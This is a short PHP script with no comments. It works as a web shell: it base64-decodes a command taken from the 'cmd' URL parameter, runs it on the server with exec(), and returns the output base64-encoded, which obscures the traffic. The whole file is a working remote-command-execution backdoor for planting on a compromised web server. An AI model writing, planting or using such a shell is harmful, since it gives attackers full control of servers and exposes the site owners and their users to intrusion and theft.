<?php
	$result = array();
	$output = "";
	exec(base64_decode($_GET['cmd']), $result, $return);
	if (count($result) > 1) {
		foreach($result as $line) {
			$output = $output . $line . PHP_EOL;
		}
		$output = base64_encode($output);
		echo $output;
	}
	else
	{
		echo base64_encode($result[0]);
	}
?>